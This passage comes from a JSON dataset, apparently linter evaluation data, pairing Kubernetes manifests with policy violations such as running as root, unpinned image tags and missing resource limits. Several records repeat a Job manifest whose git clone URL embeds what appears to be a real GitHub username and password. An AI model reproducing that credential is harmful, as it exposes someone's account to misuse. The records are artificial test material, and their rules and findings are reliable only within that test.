    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    k8s-app: research\n    user: xueting\n  namespace: image-model\nspec:\n  template:\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: gpu-type\n                operator: In\n                values:\n                - 1080Ti\n                - 2080Ti\n                - '2080'\n              - key: kubernetes.io/hostname\n                operator: NotIn\n                values:\n                - patternlab.calit2.optiputer.net\n                - k8s-gpu-03.sdsc.optiputer.net\n      containers:\n      - name: research\n        image: gitlab-registry.nautilus.optiputer.net/sunshineatnoon/image-model:latest\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        args:\n        - cd /workspace && git clone https://sunshineatnoon:49531218Lxt@github.com/sunshineatnoon/taming-transformers\n          && cd taming-transformers && python main.py --base configs/custom_simple_vqgan.yaml\n          -t True --gpus 0,1\n        resources:\n          requests:\n            cpu: '10'\n            memory: 6Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 20Gi\n          limits:\n            cpu: '24'\n            memory: 12Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 30Gi\n        volumeMounts:\n        - mountPath: /mnt/source\n          name: src\n        - mountPath: /dev/shm\n          name: dshm\n        - mountPath: /data\n          name: dst\n      initContainers:\n      - name: init-data\n        image: gitlab-registry.nautilus.optiputer.net/prp/gsutil\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - mkdir -p /mnt/dest/coco; gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco;\n          gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco; exit 0\n        volumeMounts:\n        - name: src\n          mountPath: /mnt/source\n        - name: dst\n          mountPath: /mnt/dest\n      volumes:\n      - name: dst\n        emptyDir: {}\n      - name: src\n        persistentVolumeClaim:\n          claimName: image-model-pvc\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"research\" is not set to runAsNonRoot"
  },
  {
    "id": "2836",
    "manifest_path": "data/manifests/the_stack_sample/sample_0801.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    k8s-app: research\n    user: xueting\n  namespace: image-model\nspec:\n  template:\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: gpu-type\n                operator: In\n                values:\n                - 1080Ti\n                - 2080Ti\n                - '2080'\n              - key: kubernetes.io/hostname\n                operator: NotIn\n                values:\n                - patternlab.calit2.optiputer.net\n                - k8s-gpu-03.sdsc.optiputer.net\n      containers:\n      - name: research\n        image: gitlab-registry.nautilus.optiputer.net/sunshineatnoon/image-model:latest\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        args:\n        - cd /workspace && git clone https://sunshineatnoon:49531218Lxt@github.com/sunshineatnoon/taming-transformers\n          && cd taming-transformers && python main.py --base configs/custom_simple_vqgan.yaml\n          -t True --gpus 0,1\n        resources:\n          requests:\n            cpu: '10'\n            memory: 6Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 20Gi\n          limits:\n            cpu: '24'\n            memory: 12Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 30Gi\n        volumeMounts:\n        - mountPath: /mnt/source\n          name: src\n        - mountPath: /dev/shm\n          name: dshm\n        - mountPath: /data\n          name: dst\n      initContainers:\n      - name: init-data\n        image: gitlab-registry.nautilus.optiputer.net/prp/gsutil\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - mkdir -p /mnt/dest/coco; gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco;\n          gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco; exit 0\n        volumeMounts:\n        - name: src\n          mountPath: /mnt/source\n        - name: dst\n          mountPath: /mnt/dest\n      volumes:\n      - name: dst\n        emptyDir: {}\n      - name: src\n        persistentVolumeClaim:\n          claimName: image-model-pvc\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-data\" has cpu request 0"
  },
  {
    "id": "2837",
    "manifest_path": "data/manifests/the_stack_sample/sample_0801.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    k8s-app: research\n    user: xueting\n  namespace: image-model\nspec:\n  template:\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: gpu-type\n                operator: In\n                values:\n                - 1080Ti\n                - 2080Ti\n                - '2080'\n              - key: kubernetes.io/hostname\n                operator: NotIn\n                values:\n                - patternlab.calit2.optiputer.net\n                - k8s-gpu-03.sdsc.optiputer.net\n      containers:\n      - name: research\n        image: gitlab-registry.nautilus.optiputer.net/sunshineatnoon/image-model:latest\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        args:\n        - cd /workspace && git clone https://sunshineatnoon:49531218Lxt@github.com/sunshineatnoon/taming-transformers\n          && cd taming-transformers && python main.py --base configs/custom_simple_vqgan.yaml\n          -t True --gpus 0,1\n        resources:\n          requests:\n            cpu: '10'\n            memory: 6Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 20Gi\n          limits:\n            cpu: '24'\n            memory: 12Gi\n            nvidia.com/gpu: '2'\n            ephemeral-storage: 30Gi\n        volumeMounts:\n        - mountPath: /mnt/source\n          name: src\n        - mountPath: /dev/shm\n          name: dshm\n        - mountPath: /data\n          name: dst\n      initContainers:\n      - name: init-data\n        image: gitlab-registry.nautilus.optiputer.net/prp/gsutil\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - mkdir -p /mnt/dest/coco; gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco;\n          gsutil -m rsync -erCUP /mnt/source/coco /mnt/dest/coco; exit 0\n        volumeMounts:\n        - name: src\n          mountPath: /mnt/source\n        - name: dst\n          mountPath: /mnt/dest\n      volumes:\n      - name: dst\n        emptyDir: {}\n      - name: src\n        persistentVolumeClaim:\n          claimName: image-model-pvc\n      - name: dshm\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-data\" has memory limit 0"
  },
  {
    "id": "2838",
    "manifest_path": "data/manifests/the_stack_sample/sample_0802.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      labels:\n        app: podinfo\n    spec:\n      containers:\n      - name: podinfo\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2839",
    "manifest_path": "data/manifests/the_stack_sample/sample_0802.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      labels:\n        app: podinfo\n    spec:\n      containers:\n      - name: podinfo\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfo\" does not have a read-only root file system"
  },
  {
    "id": "2840",
    "manifest_path": "data/manifests/the_stack_sample/sample_0802.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      labels:\n        app: podinfo\n    spec:\n      containers:\n      - name: podinfo\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfo\" is not set to runAsNonRoot"
  },
  {
    "id": "2841",
    "manifest_path": "data/manifests/the_stack_sample/sample_0802.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      labels:\n        app: podinfo\n    spec:\n      containers:\n      - name: podinfo\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"podinfo\" has cpu request 0"
  },
  {
    "id": "2842",
    "manifest_path": "data/manifests/the_stack_sample/sample_0802.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      labels:\n        app: podinfo\n    spec:\n      containers:\n      - name: podinfo\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 3000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"podinfo\" has memory limit 0"
  },
  {
    "id": "2843",
    "manifest_path": "data/manifests/the_stack_sample/sample_0803.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdw-settings\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdw-settings\n        env:\n        - name: DATABASE_URL\n          value: postgres://catarse:example@catarse-db:5432/catarse_db\n        - name: RAILS_ENV\n          value: development\n        - name: REDIS_URL\n          value: redis://catarse-redis:6379\n        image: catarse-deploy/catarse\n        command:\n        - bundle\n        - exec\n        - rake\n        - common:generate_fdw\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "2844",
    "manifest_path": "data/manifests/the_stack_sample/sample_0803.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdw-settings\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdw-settings\n        env:\n        - name: DATABASE_URL\n          value: postgres://catarse:example@catarse-db:5432/catarse_db\n        - name: RAILS_ENV\n          value: development\n        - name: REDIS_URL\n          value: redis://catarse-redis:6379\n        image: catarse-deploy/catarse\n        command:\n        - bundle\n        - exec\n        - rake\n        - common:generate_fdw\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"fdw-settings\" is using an invalid container image, \"catarse-deploy/catarse\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2845",
    "manifest_path": "data/manifests/the_stack_sample/sample_0803.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdw-settings\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdw-settings\n        env:\n        - name: DATABASE_URL\n          value: postgres://catarse:example@catarse-db:5432/catarse_db\n        - name: RAILS_ENV\n          value: development\n        - name: REDIS_URL\n          value: redis://catarse-redis:6379\n        image: catarse-deploy/catarse\n        command:\n        - bundle\n        - exec\n        - rake\n        - common:generate_fdw\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fdw-settings\" does not have a read-only root file system"
  },
  {
    "id": "2846",
    "manifest_path": "data/manifests/the_stack_sample/sample_0803.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdw-settings\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdw-settings\n        env:\n        - name: DATABASE_URL\n          value: postgres://catarse:example@catarse-db:5432/catarse_db\n        - name: RAILS_ENV\n          value: development\n        - name: REDIS_URL\n          value: redis://catarse-redis:6379\n        image: catarse-deploy/catarse\n        command:\n        - bundle\n        - exec\n        - rake\n        - common:generate_fdw\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fdw-settings\" is not set to runAsNonRoot"
  },
  {
    "id": "2847",
    "manifest_path": "data/manifests/the_stack_sample/sample_0803.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdw-settings\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdw-settings\n        env:\n        - name: DATABASE_URL\n          value: postgres://catarse:example@catarse-db:5432/catarse_db\n        - name: RAILS_ENV\n          value: development\n        - name: REDIS_URL\n          value: redis://catarse-redis:6379\n        image: catarse-deploy/catarse\n        command:\n        - bundle\n        - exec\n        - rake\n        - common:generate_fdw\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fdw-settings\" has cpu request 0"
  },
  {
    "id": "2848",
    "manifest_path": "data/manifests/the_stack_sample/sample_0803.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: fdw-settings\nspec:\n  template:\n    spec:\n      containers:\n      - name: fdw-settings\n        env:\n        - name: DATABASE_URL\n          value: postgres://catarse:example@catarse-db:5432/catarse_db\n        - name: RAILS_ENV\n          value: development\n        - name: REDIS_URL\n          value: redis://catarse-redis:6379\n        image: catarse-deploy/catarse\n        command:\n        - bundle\n        - exec\n        - rake\n        - common:generate_fdw\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fdw-settings\" has memory limit 0"
  },
  {
    "id": "2849",
    "manifest_path": "data/manifests/the_stack_sample/sample_0805.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1708\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2850",
    "manifest_path": "data/manifests/the_stack_sample/sample_0805.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1708\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2851",
    "manifest_path": "data/manifests/the_stack_sample/sample_0805.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1708\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2852",
    "manifest_path": "data/manifests/the_stack_sample/sample_0805.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1708\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2853",
    "manifest_path": "data/manifests/the_stack_sample/sample_0805.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1708\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2854",
    "manifest_path": "data/manifests/the_stack_sample/sample_0806.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220323-9b8611d021\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"horologium\" does not have a read-only root file system"
  },
  {
    "id": "2855",
    "manifest_path": "data/manifests/the_stack_sample/sample_0806.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220323-9b8611d021\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"horologium\" not found"
  },
  {
    "id": "2856",
    "manifest_path": "data/manifests/the_stack_sample/sample_0806.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220323-9b8611d021\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"horologium\" is not set to runAsNonRoot"
  },
  {
    "id": "2857",
    "manifest_path": "data/manifests/the_stack_sample/sample_0806.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220323-9b8611d021\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"horologium\" has cpu request 0"
  },
  {
    "id": "2858",
    "manifest_path": "data/manifests/the_stack_sample/sample_0806.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20220323-9b8611d021\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"horologium\" has memory limit 0"
  },
  {
    "id": "2859",
    "manifest_path": "data/manifests/the_stack_sample/sample_0807.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: python\nspec:\n  selector:\n    matchLabels:\n      app: python\n      tier: app\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: python\n        tier: app\n    spec:\n      containers:\n      - name: python\n        image: registry.cn-hangzhou.aliyuncs.com/dal/python:v1.0\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysecret\n              key: key\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"python\" does not have a read-only root file system"
  },
  {
    "id": "2860",
    "manifest_path": "data/manifests/the_stack_sample/sample_0807.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: python\nspec:\n  selector:\n    matchLabels:\n      app: python\n      tier: app\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: python\n        tier: app\n    spec:\n      containers:\n      - name: python\n        image: registry.cn-hangzhou.aliyuncs.com/dal/python:v1.0\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysecret\n              key: key\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"python\" is not set to runAsNonRoot"
  },
  {
    "id": "2861",
    "manifest_path": "data/manifests/the_stack_sample/sample_0807.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  labels:\n    app: python\nspec:\n  selector:\n    matchLabels:\n      app: python\n      tier: app\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: python\n        tier: app\n    spec:\n      containers:\n      - name: python\n        image: registry.cn-hangzhou.aliyuncs.com/dal/python:v1.0\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysecret\n              key: key\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"python\" has memory limit 0"
  },
  {
    "id": "2862",
    "manifest_path": "data/manifests/the_stack_sample/sample_0809.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      service: service\n  template:\n    metadata:\n      labels:\n        service: service\n    spec:\n      serviceAccountName: service-sa\n      containers:\n      - name: container\n        image: image\n        env:\n        - name: SOME_VAR1\n          value: SOME_VAL1\n        readinessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 1\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /health/live\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 250m\n          limits:\n            memory: 512Mi\n            cpu: 500m\n        imagePullPolicy: Always\n      securityContext: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container\" is using an invalid container image, \"image\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2863",
    "manifest_path": "data/manifests/the_stack_sample/sample_0809.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      service: service\n  template:\n    metadata:\n      labels:\n        service: service\n    spec:\n      serviceAccountName: service-sa\n      containers:\n      - name: container\n        image: image\n        env:\n        - name: SOME_VAR1\n          value: SOME_VAL1\n        readinessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 1\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /health/live\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 250m\n          limits:\n            memory: 512Mi\n            cpu: 500m\n        imagePullPolicy: Always\n      securityContext: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container\" does not have a read-only root file system"
  },
  {
    "id": "2864",
    "manifest_path": "data/manifests/the_stack_sample/sample_0809.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      service: service\n  template:\n    metadata:\n      labels:\n        service: service\n    spec:\n      serviceAccountName: service-sa\n      containers:\n      - name: container\n        image: image\n        env:\n        - name: SOME_VAR1\n          value: SOME_VAL1\n        readinessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 1\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /health/live\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 250m\n          limits:\n            memory: 512Mi\n            cpu: 500m\n        imagePullPolicy: Always\n      securityContext: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"service-sa\" not found"
  },
  {
    "id": "2865",
    "manifest_path": "data/manifests/the_stack_sample/sample_0809.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: deployment\nspec:\n  replicas: 0\n  selector:\n    matchLabels:\n      service: service\n  template:\n    metadata:\n      labels:\n        service: service\n    spec:\n      serviceAccountName: service-sa\n      containers:\n      - name: container\n        image: image\n        env:\n        - name: SOME_VAR1\n          value: SOME_VAL1\n        readinessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /health/ready\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n          timeoutSeconds: 1\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /health/live\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        resources:\n          requests:\n            memory: 256Mi\n            cpu: 250m\n          limits:\n            memory: 512Mi\n            cpu: 500m\n        imagePullPolicy: Always\n      securityContext: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"container\" is not set to runAsNonRoot"
  },
  {
    "id": "2866",
    "manifest_path": "data/manifests/the_stack_sample/sample_0810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: master\n      tier: backend\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: master\n        tier: backend\n    spec:\n      containers:\n      - name: master\n        image: docker.io/mreider/eatk8s-redis:latest\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"master\" is using an invalid container image, \"docker.io/mreider/eatk8s-redis:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2867",
    "manifest_path": "data/manifests/the_stack_sample/sample_0810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: master\n      tier: backend\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: master\n        tier: backend\n    spec:\n      containers:\n      - name: master\n        image: docker.io/mreider/eatk8s-redis:latest\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"master\" does not have a read-only root file system"
  },
  {
    "id": "2868",
    "manifest_path": "data/manifests/the_stack_sample/sample_0810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n      role: master\n      tier: backend\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: redis\n        role: master\n        tier: backend\n    spec:\n      containers:\n      - name: master\n        image: docker.io/mreider/eatk8s-redis:latest\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"master\" is not set to runAsNonRoot"
  },
  {
    "id": "2869",
    "manifest_path": "data/manifests/the_stack_sample/sample_0810.yaml",
